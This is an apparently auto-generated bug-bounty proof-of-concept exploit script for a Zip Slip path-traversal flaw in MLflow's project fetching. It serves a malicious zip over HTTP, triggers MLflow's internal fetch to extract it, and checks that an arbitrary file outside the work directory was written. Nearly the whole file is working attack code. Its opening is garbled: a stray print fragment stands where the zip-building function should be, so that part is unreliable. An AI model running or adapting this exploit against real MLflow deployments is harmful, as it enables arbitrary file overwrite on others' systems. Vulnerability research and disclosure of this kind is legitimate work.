#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: afo-000
# Auto-generated — run with: python3 mlflow-afo-000-poc.py
#
[+] Created malicious zip: {output_path}")
    print(f"    Entry: {arcname} -> {payload_path}")

def serve_zip_locally(zip_path):
    """
    Start a simple HTTP server to serve the zip file.
    Returns the URL to the zip file.
    """
    import http.server
    import socketserver
    import threading

    port = 8765
    directory = os.path.dirname(zip_path)
    os.chdir(directory)

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    url = f"http://localhost:{port}/{os.path.basename(zip_path)}"
    print(f"[+] Serving zip at {url}")
    return url

def trigger_mlflow_fetch(uri):
    """
    Trigger MLflow's project fetch logic with the given URI.
    This calls mlflow.projects._fetch_project which eventually calls _unzip_repo.
    """
    from mlflow.projects.utils import _fetch_project
    try:
        work_dir = _fetch_project(uri=uri, version=None)
        print(f"[+] MLflow fetched project to: {work_dir}")
        return work_dir
    except Exception as e:
        print(f"[-] Error during fetch: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="MLflow Zip Slip PoC")
    parser.add_argument("--target", default="http://localhost:8765/malicious.zip",
                        help="URL to the malicious zip file (default: local server)")
    parser.add_argument("--payload", default="/tmp/poc_success.txt",
                        help="Target file path to write (default: /tmp/poc_success.txt)")
    parser.add_argument("--content", default="pwned",
                        help="Content to write to the target file (default: 'pwned')")
    parser.add_argument("--serve", action="store_true",
                        help="Start a local HTTP server to serve the zip")
    args = parser.parse_args()

    # Create malicious zip
    zip_path = os.path.join(tempfile.gettempdir(), "malicious.zip")
    create_malicious_zip(zip_path, args.payload, args.content)

    # Optionally serve locally
    if args.serve:
        uri = serve_zip_locally(zip_path)
    else:
        uri = args.target

    # Trigger MLflow fetch
    print("[*] Triggering MLflow project fetch...")
    work_dir = trigger_mlflow_fetch(uri)

    # Check if payload was written
    if os.path.exists(args.payload):
        with open(args.payload, 'r') as f:
            content = f.read().strip()
        print(f"[+] Success! Payload file {args.payload} exists with content: {content}")
    else:
        print(f"[-] Payload file {args.payload} not found. Exploit may have failed.")

    # Cleanup
    os.remove(zip_path)
    if work_dir and os.path.exists(work_dir):
        shutil.rmtree(work_dir, ignore_errors=True)
    print("[*] Cleanup done.")

if __name__ == "__main__":
    main()
